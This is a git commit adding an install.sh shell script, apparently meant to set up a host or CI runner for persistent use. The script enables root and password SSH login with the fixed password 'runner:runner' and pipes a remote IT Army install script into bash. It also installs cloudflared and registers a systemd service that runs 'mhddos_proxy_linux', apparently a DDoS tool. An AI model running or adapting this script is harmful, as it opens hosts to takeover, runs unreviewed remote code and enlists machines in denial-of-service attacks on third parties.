5478214d59e5db01d436bef60cfca2a9f93a9423
pornnewbee <65003745+pornnewbee@users.noreply.github.com>
2025-12-21 11:52:10 +0800

    Create install.sh

---
+++ sub/install.sh
@@ -0,0 +1,39 @@
+#!/bin/bash
+set -e
+
+echo "[*] Enable SSH password login and root login"
+sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+echo "runner:runner" | chpasswd
+systemctl restart ssh
+
+echo "[*] Run install script"
+curl -fsSL https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh | bash -s
+
+echo "[*] Install tools"
+curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
+  -o /usr/local/bin/cloudflared
+chmod +x /usr/local/bin/cloudflared
+
+echo "[*] Prepare directories"
+mkdir -p /mnt/repo/test
+chmod 777 /mnt/repo/test
+mkdir -p /opt/itarmy/bin
+
+echo "[*] Preparing config"
+# 注意：这里不使用 sudo，避免 gh auth 失效
+git clone https://github.com/pornnewbee/blue.git /mnt/repo/test
+
+echo "[*] Install Preparing service and binary"
+install -Dm644 /mnt/repo/test/itarmy/mhddos.service \
+  /etc/systemd/system/mhddos.service
+
+install -Dm755 /mnt/repo/test/itarmy/bin/mhddos_proxy_linux \
+  /opt/itarmy/bin/mhddos_proxy_linux
+
+echo "[*] Enable and start service"
+systemctl daemon-reload
+systemctl enable mhddos.service
+systemctl restart mhddos.service
+
+echo "[+] install.sh finished successfully"
